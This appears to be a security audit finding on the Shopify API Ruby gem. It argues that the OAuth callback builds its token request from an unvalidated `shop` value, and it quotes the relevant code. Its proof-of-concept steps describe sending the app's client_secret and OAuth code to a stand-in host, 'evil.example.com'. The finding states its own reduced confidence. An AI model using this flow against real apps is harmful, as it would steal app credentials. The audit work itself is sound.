I found a concrete identity-binding gap: `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` never call `ShopifyAPI::Utils::ShopValidator.sanitize!`, even though that exact validator exists in the gem and is used by `TokenExchange.migrate_to_expiring_token` for the same purpose (protecting the endpoint that carries `client_secret`).

### Title
OAuth `shop` parameter is not validated against `ShopValidator` before it is used to build the URL that receives `client_secret`, enabling SSRF with app credentials - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the OAuth token-exchange request against a host derived directly from the attacker-suppliable `shop` value, without ever routing it through `Utils::ShopValidator.sanitize!`. The gem itself demonstrates the correct binding elsewhere (`TokenExchange.migrate_to_expiring_token` calls `sanitize!` before constructing the same kind of request), showing this is a missing check rather than an accepted design tradeoff.

### Finding Description
`validate_auth_callback` only verifies the OAuth callback's HMAC over `code/host/shop/state/timestamp` via `Utils::HmacValidator.validate(auth_query)`, which validates the *authenticity* of the query but not that `shop` is a real `*.myshopify.com` (or otherwise trusted) domain: [1](#0-0) 

The resulting `null_session` is built with `Auth::Session.new(shop: auth_query.shop)` and handed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which sends `client_id`/`client_secret` in the POST body: [2](#0-1) 

`HttpClient#initialize` constructs the target host straight from `session.shop` with no domain restriction: [3](#0-2) 

The equality that should hold is: `host that receives client_secret == host validated as a genuine Shopify (myshopify.com/trusted) domain`. Instead the code enforces only `host that receives client_secret == host present in an HMAC-authenticated query`, i.e., "authentic-looking" is substituted for "trusted domain". The gem's own `ShopValidator` module exists precisely to enforce the missing equality, and is already applied in the sibling code path `TokenExchange.migrate_to_expiring_token`: [4](#0-3) 
but is conspicuously absent from `Oauth.begin_auth`/`validate_auth_callback`.

### Impact Explanation
If the `shop` value that reaches `validate_auth_callback` can be a non-`myshopify.com` string (e.g., because the host application forwards the `shop` query parameter from the initial, pre-HMAC `begin_auth` step, or because the HMAC check only proves the query wasn't tampered with in transit but says nothing about what domain the value names), the library will POST the app's `client_id` and `client_secret` to an attacker-controlled host. That is a Critical-class SSRF-with-credentials primitive: the app's `client_secret` (and the OAuth `code`) are exfiltrated to a third party, which is sufficient to mint arbitrary offline access tokens once combined with a stolen `code`.

### Likelihood Explanation
Requires the calling application to accept the OAuth `shop` value from the `begin_auth`/callback flow without independently constraining it to `*.myshopify.com` — which the library's own documented API and `begin_auth`/`validate_auth_callback` signatures accept as a bare `String` with no in-gem enforcement, unlike `migrate_to_expiring_token`. Because `ShopValidator.sanitize!` is present and used in exactly one of the two analogous OAuth-credential-sending paths but not the other, this is best classified as a gap in this gem's own defense-in-depth rather than a certainty of exploitation in every integration — the certainty depends on how the host app plumbs the `shop` string into these calls.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop, myshopify_domain: ...)` (or equivalent) on `shop` inside `Oauth.begin_auth` and on `auth_query.shop` inside `Oauth.validate_auth_callback` before constructing the authorize URL / access-token request, mirroring what `TokenExchange.migrate_to_expiring_token` already does.

### Proof of Concept
Not independently confirmed end-to-end (would require tracing exactly how a host Rails/ShopifyApp integration passes the initial `shop` param through to `begin_auth`/`validate_auth_callback` — that call-site is outside this gem). Conceptually:
1. Attacker gets a victim app instance to call `ShopifyAPI::Auth::Oauth.begin_auth(shop: "evil.example.com", ...)` (via a manipulated `shop` query param on the app's login endpoint, if the host app doesn't itself validate the shop domain).
2. On callback, `validate_auth_callback` is invoked with `auth_query.shop == "evil.example.com"` and a valid HMAC computed over that value (the initiator, e.g. a malicious "app install" flow, controls what gets signed if it can drive the callback parameters, or the value simply passes through unchanged from step 1 to step 2 in some integrations).
3. `Clients::HttpClient` builds `@base_uri = "https://evil.example.com"` and POSTs `{client_id, client_secret, code}` there.
4. Attacker's server receives the app's `client_secret` and the OAuth `code`, and can independently redeem the code for an offline access token against Shopify's real endpoint.

This is flagged with reduced confidence because full confirmation requires verifying, outside this gem, that some caller pattern allows an unvalidated `shop` string to reach these two methods; within the gem's own code, no validation gate exists on this path where one exists on the sibling path.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
